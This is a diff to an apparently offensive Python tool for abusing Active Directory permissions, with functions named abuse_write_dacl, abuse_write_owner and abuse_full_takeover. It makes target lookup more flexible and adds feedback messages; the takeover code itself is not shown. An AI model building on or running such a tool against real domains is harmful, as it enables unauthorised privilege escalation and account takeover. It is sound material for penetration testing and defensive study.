@@ -112,12 +112,56 @@ def ldap_connect(dc_ip, domain, username, password):
 def get_base_dn(domain):
     return ','.join([f"DC={part}" for part in domain.split('.')])
 
-def get_object_dn(conn, base_dn, sam):
+def get_object_dn(conn, base_dn, identifier):
+    """
+    Find an object by multiple attributes:
+    1. distinguishedName (if full DN provided)
+    2. sAMAccountName
+    3. name
+    4. cn
+    Also escapes special characters in the filter.
+    """
     try:
-        conn.search(base_dn, f'(sAMAccountName={sam})', SUBTREE,
+        # First, try as distinguishedName directly
+        if identifier.startswith('CN=') or identifier.startswith('OU=') or identifier.startswith('DC='):
+            try:
+                conn.search(identifier, '(objectClass=*)', SUBTREE,
+                            attributes=['distinguishedName', 'objectClass', 'objectSid'])
+                if conn.entries:
+                    return conn.entries[0]
+            except Exception:
+                pass  # Not a valid DN, continue with other methods
+
+        # Escape special LDAP filter characters
+        escaped_id = escape_filter_chars(identifier)
+
+        # Try sAMAccountName
+        conn.search(base_dn, f'(sAMAccountName={escaped_id})', SUBTREE,
                     attributes=['distinguishedName', 'objectClass', 'objectSid'])
-        return conn.entries[0] if conn.entries else None
-    except Exception:
+        if conn.entries:
+            return conn.entries[0]
+
+        # Try name
+        conn.search(base_dn, f'(name={escaped_id})', SUBTREE,
+                    attributes=['distinguishedName', 'objectClass', 'objectSid'])
+        if conn.entries:
+            return conn.entries[0]
+
+        # Try cn
+        conn.search(base_dn, f'(cn={escaped_id})', SUBTREE,
+                    attributes=['distinguishedName', 'objectClass', 'objectSid'])
+        if conn.entries:
+            return conn.entries[0]
+
+        # Try with wildcards (for cases like MICROSOFTDNS.CS.ORG)
+        conn.search(base_dn, f'(name=*{escaped_id}*)', SUBTREE,
+                    attributes=['distinguishedName', 'objectClass', 'objectSid'])
+        if conn.entries:
+            return conn.entries[0]
+
+        return None
+    except Exception as e:
+        print(Fore.RED + f"[-] Error searching for object: {e}" + Style.RESET_ALL)
         return None
 
 def get_object_sid(conn, base_dn, sam):
@@ -125,6 +169,28 @@ def get_object_sid(conn, base_dn, sam):
     if entry:
         return str(entry['objectSid'].value)
     return None
+
+def find_object_with_feedback(conn, base_dn, identifier):
+    """
+    Find object with detailed feedback about what was tried.
+    Returns the entry or None with printed messages.
+    """
+    print(Fore.YELLOW + f"[*] Searching for object: '{identifier}'" + Style.RESET_ALL)
+
+    entry = get_object_dn(conn, base_dn, identifier)
+
+    if entry:
+        obj_dn = str(entry.distinguishedName)
+        obj_class = entry['objectClass'].value if 'objectClass' in entry else 'Unknown'
+        print(Fore.GREEN + f"[+] Found object: {obj_dn}" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] Object class: {obj_class}" + Style.RESET_ALL)
+        return entry
+    else:
+        print(Fore.RED + f"[-] Object '{identifier}' not found!" + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] Tried searching by: distinguishedName, sAMAccountName, name, cn" + Style.RESET_ALL)
+        print(Fore.YELLOW + "[*] Tip: You can also enter the full distinguishedName (DN)" + Style.RESET_ALL)
+        return None
+
 
 def create_ace(sid, access_mask, ace_type='allowed'):
 
@@ -215,9 +281,8 @@ def abuse_write_dacl(conn, base_dn, attacker_sam, target_sam):
 
     access_mask, perm_name, is_extended = perm_map[perm_choice]
 
-    target_entry = get_object_dn(conn, base_dn, target_sam)
+    target_entry = find_object_with_feedback(conn, base_dn, target_sam)
     if not target_entry:
-        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
         return
     target_dn = str(target_entry.distinguishedName)
 
@@ -270,9 +335,8 @@ def abuse_write_owner(conn, base_dn, attacker_sam, target_sam, limited=False):
     label = "WriteOwner (Limited)" if limited else "WriteOwner"
     print(Fore.CYAN + f"\n[*] {label}: Taking ownership of '{target_sam}'" + Style.RESET_ALL)
 
-    target_entry = get_object_dn(conn, base_dn, target_sam)
+    target_entry = find_object_with_feedback(conn, base_dn, target_sam)
     if not target_entry:
-        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
         return
     target_dn = str(target_entry.distinguishedName)
 
@@ -312,9 +376,8 @@ def abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="full"):
     label = mode_labels.get(mode, "Owns")
     print(Fore.CYAN + f"\n[*] {label}: Abusing ownership of '{target_sam}'" + Style.RESET_ALL)
 
-    target_entry = get_object_dn(conn, base_dn, target_sam)
+    target_entry = find_object_with_feedback(conn, base_dn, target_sam)
     if not target_entry:
-        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
         return
     target_dn = str(target_entry.distinguishedName)
 
@@ -365,9 +428,8 @@ def abuse_full_takeover(conn, base_dn, attacker_sam, target_sam):
     print(Fore.CYAN + f"\n[*] Full Takeover Chain on '{target_sam}'" + Style.RESET_ALL)
     print(Fore.YELLOW + "[*] Step 1: WriteOwner - Taking ownership..." + Style.RESET_ALL)
 
-    target_entry = get_object_dn(conn, base_dn, target_sam)
+    target_entry = find_object_with_feedback(conn, base_dn, target_sam)
     if not target_entry:
-        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
         return
     target_dn = str(target_entry.distinguishedName)
 
